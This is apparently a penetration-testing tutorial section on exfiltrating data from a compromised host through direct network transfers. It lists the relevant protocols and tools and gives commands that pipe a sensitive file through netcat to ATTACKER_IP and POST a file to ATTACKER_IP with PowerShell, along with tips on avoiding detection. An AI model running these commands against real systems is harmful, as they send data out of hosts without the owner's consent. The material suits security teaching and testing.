Overview of Direct Transfers

Direct transfers utilize standard network protocols to move data from a compromised host to an attacker-controlled system. This method is straightforward when outbound internet access and relevant client tools are available.

  • Protocols: HTTP/HTTPS, FTP, SCP/SFTP.
  • Tools (Linux): wget, curl, scp, netcat.
  • Tools (Windows): PowerShell's Invoke-WebRequest, bitsadmin, ftp.exe.

Common Mistake: Using unencrypted protocols (like plain HTTP or FTP) for sensitive data, risking interception and detection.

Key Takeaway

Direct transfers are efficient for exfiltrating data using common protocols, but require outbound access and careful consideration of encryption to avoid detection.

Code Example

Linux Exfiltration via Netcat

Attacker sets up a listener:

# On Attacker Machine (Kali/Parrot)
nc -lvnp 4444 > /tmp/loot/exfiltrated_secrets.txt

Target sends the file:

# On Target Linux VM (as root)
cat /path/to/sensitive.txt | nc ATTACKER_IP 4444

Pro Tip: Always verify the exfiltrated file on your attacker machine to ensure data integrity and completeness.

Windows Example

Windows Exfiltration via PowerShell

Using Invoke-WebRequest to send a file:

# On Windows target
Invoke-WebRequest -Uri "http://ATTACKER_IP:8000/upload" -Method POST -InFile "C:\path  o\sensitive.txt"
